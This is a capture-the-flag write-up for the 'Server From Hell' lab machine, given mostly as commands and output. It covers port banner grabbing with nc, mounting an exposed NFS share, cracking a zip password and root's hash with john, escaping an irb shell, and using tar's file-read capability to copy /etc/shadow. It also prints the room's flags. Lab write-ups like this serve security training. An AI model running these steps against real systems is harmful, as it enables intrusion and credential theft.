# The_Server_From_Hell 

> VOiD | Friday 04 March 2022 06:54:36 AM UTC

My IP : 10.8.253.221
Target IP : 10.10.173.107 



## PORT 1337 [message]
```bash
nc 10.10.173.107 1337
Welcome traveller, to the beginning of your journey
To begin, find the trollface
Legend says hes hiding in the first 100 ports
Try printing the banners from the ports               


for i in {1..100};do echo -n "$i ";nc 10.10.173.107 $i;echo "" ;done | tee trollface.txt        

21 550 12345 0f7000f800770008777 go to port 12345 80008f7f700880cf00

```

## PORT 12345
```bash
nc 10.10.173.107 12345
NFS shares are cool, especially when they are misconfigured
It's on the standard port, no need for another scan        
```

## PORT 2049 [nsf]
```bash
showmount -e 10.10.173.107 
Export list for 10.10.173.107:
/home/nfs *

mount -t nfs [-o vers=2] <ip>:<remote_folder> <local_folder> -o nolock

sudo mount -t nfs  10.10.173.107:/home/nfs test -o nolock

we get a backup.zip

john --wordlist=/usr/share/wordlists/rockyou.txt hash 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
zxcvbnm          (backup.zip)    


cat hint.txt 
2500-4500

authorized-keys : hades@hell

cat flag.txt                                     
thm{h0p3_y0u_l1k3d_th3_f1r3w4ll}


for i in {2500..4500};do ssh hades@10.10.173.107 -p $i;done | tee check.txt
kex_exchange_identification: read: Connection reset by peer
Connection reset by 10.10.173.107 port 3332
The authenticity of host '[10.10.173.107]:3333 ([10.10.173.107]:3333)' cant be established.
ED25519 key fingerprint is SHA256:Zj1jn6b0042OHU6nvWMtd/PCNk57yPlHaXTatTQuKuQ.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? 

ssh -i id_rsa hades@10.10.173.107 -p 3333

irb(main):001:0>
we are in a ruby interactive shell

irb(main):004:0> exec "/bin/bash"

hades@hell:~$ cat user.txt 
thm{sh3ll_3c4p3_15_v3ry_1337}

```


## USER [hades]
```bash
hades@hell:/tmp$ getcap -r / 2>/dev/null
/usr/bin/mtr-packet = cap_net_raw+ep
/bin/tar = cap_dac_read_search+ep

tar can read every file 

tar -cvf shadow.tar /etc/shadow
tar -xvf shadow.tar


unshadow passwd shadow  > unshadowed
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed
trustno1         (root)     

root@hell:~# cat root.txt 
thm{w0w_n1c3_3sc4l4t10n}

```

